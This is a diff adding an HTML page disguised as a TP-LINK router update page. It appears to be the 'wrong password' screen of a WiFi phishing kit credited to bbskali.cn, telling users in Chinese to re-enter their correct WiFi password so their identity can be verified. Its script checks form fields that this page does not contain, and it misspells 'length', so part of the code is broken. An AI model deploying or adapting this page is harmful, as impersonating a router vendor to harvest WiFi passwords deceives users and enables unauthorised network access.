@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang=en> <head><title>Router Configuration Page</title><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=bootstrap.min.css><script src=jquery.min.js></script><script src=bootstrap.min.js></script><!-- CSS --><style type=text/css>
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+        }
+  </style></head> <body> <!-- Start navigation bar --> <!-- To change the navigation bar color change background attribute --> <nav class="navbar navbar-inverse" style=background:RoyalBlue;margin-top:2em;> <div class=container-fluid> <div class=navbar-header> <button type=button class=navbar-toggle data-toggle=collapse data-target=#myNavbar> <span class=icon-bar></span> <span class=icon-bar></span> <span class=icon-bar></span> </button> 
+	<div><svg width="160" height="41" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+
+ <g>
+  <title>background</title>
+  <rect fill="none" id="canvas_background" height="479" width="1060" y="-1" x="-1"/>
+ </g>
+ <g>
+  <title>Layer 1</title>
+  <image xlink:href="data:img/png;base64,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" height="33" width="132" y="1" x="8" data-name="图层 1" id="图层_1"/>
+ </g>
+</svg></div> </div> </div> </nav> <!-- End navigation bar --> <!-- Start page content --> <div class=container> <div class=col-sm> <h2 class=text-center style=color:RoyalBlue>更新失败！</h2> </div> <div class="alert alert-danger"> <p>请输入正确的WiFi密码</p> </div> <div>正确的密码能够帮助我们验证您的身份，请输入正确的密码以便完成更新……<div id=push></div> </div> <!-- Start page content --> <!-- Start footer --> <footer class=footer> <div class="container text-center"> <p class=text-muted>TP-LINK© 2020, All bbskali.cn</p> </div> </footer> <!-- End footer --> <script>
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+
+    // get the password box and checkbox elements
+  var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+    if ( box.checked != true ){
+          // display no checkbox message
+          $("#no-checkbox").modal("show");
+    return false;
+        }
+        if ( input.value.lenght < 7 ||  input.value.lenght > 64){
+    // display no password message
+    $("#empty-pass").modal("show");
+    return false;
+    }
+
+
+});
+
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+  var box = document.getElementById("check-box");
+  var input = document.getElementById("pwd");
+
+  // if the box is checked
+  if ( box.checked == true )
+    {
+      // enabale the password box
+      input.disabled = false;
+    }
+  else
+    {
+      // disable the password box
+      input.disabled = true;
+    }
+  }
+</script> </body> </html> 
